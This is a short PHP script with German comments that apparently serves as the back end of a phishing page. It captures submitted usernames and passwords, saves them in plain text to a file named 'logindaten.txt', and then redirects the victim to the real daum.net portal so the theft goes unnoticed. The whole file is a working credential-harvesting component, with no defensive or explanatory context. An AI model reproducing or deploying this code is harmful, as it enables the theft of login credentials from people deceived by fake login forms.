<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Erstellen des Textinhalts für die Datei
    $text = "Username: $username\nPassword: $password";

    // Definieren des Speicherpfads
    $file_path = 'logindaten.txt';

    // Schreiben der Datei ins Verzeichnis
    file_put_contents($file_path, $text);

    // Weiterleiten zur gewünschten Seite
    header('Location: https://www.daum.net');
    exit();
}
?>
